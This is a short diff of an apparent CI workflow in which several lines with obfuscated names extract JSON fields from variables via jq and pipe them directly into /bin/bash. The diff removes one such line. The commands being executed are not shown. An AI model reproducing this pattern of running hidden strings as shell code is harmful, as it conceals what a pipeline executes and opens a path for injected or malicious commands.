@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$jy4880" | jq -r .ar5511 | /bin/bash
           printf '%s' "$pv65555" | jq -r .ov3398 | /bin/bash
           echo $b8835 | jq -r .o99 | /bin/bash
-          echo $uvqc9 | jq -r .bxjzt4522 | /bin/bash
           printf '%s' "$md20" | jq -r .uefag0282 | /bin/bash
 
       - name: Save results
